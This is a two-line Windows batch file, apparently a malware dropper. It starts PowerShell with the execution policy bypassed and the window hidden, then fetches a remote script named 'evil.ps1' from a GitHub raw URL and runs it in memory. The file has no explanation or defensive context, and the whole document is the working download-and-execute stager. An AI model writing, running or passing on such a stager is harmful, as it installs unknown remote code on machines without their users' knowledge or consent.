@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jesusb26/ScriptPDF/refs/heads/main/evil.ps1')"
